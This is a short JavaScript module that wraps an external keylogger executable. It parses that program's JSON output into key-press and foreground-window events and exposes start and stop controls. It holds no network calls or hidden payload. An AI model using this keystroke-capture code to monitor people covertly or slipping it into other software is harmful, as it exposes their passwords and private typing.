pkg('op.keylogger', () => {

	var log = pkg('util.log'),
		winapi = pkg('win.api'),
		Event = pkg('util.event'),
		childProc = pkg.external('child_process');
	
	var Keylogger = function(pathToExe){ 
		this.pathToExe = pathToExe;
		this.onForegroundWindow = new Event();
		this.onKey = new Event();
	}
	
	Keylogger.prototype = {
		start: function(){ 
			this.proc = childProc.spawn(this.pathToExe, {stdio: ['ignore', 'pipe', 'inherit']});
			this.proc.unref();
			this.proc.stdout.unref();
			this.proc.stdout.on('data', line => {	
				line.toString('utf8').split('\n').filter(x => x).forEach(line => {
					try {
						line = JSON.parse(line);
					} catch(e){
						log('Failed to read JSON from keylogger: ' + line);
						return;
					}
					
					switch(line.type){
						case 'foreground_window_change': return this.onForegroundWindow.fire(line);
						case 'key': 
							line.char = (line.vk in winapi.vkReverse && winapi.vkReverse[line.vk].length === 1)? winapi.vkReverse[line.vk]: null;
							return this.onKey.fire(line);
						default: log('Unknown event type received from keylogger: "' + line.type + '" (' + typeof(line.type) + ')');
					}
					
				});
			});
			
			this.proc.on('close', () => log('Keylogger child process exited unexpectedly!'));
			
			return this;
		},
		stop: function(){ 
			this.proc.kill(); 
			return this;
		}
	};
	
	return Keylogger;

});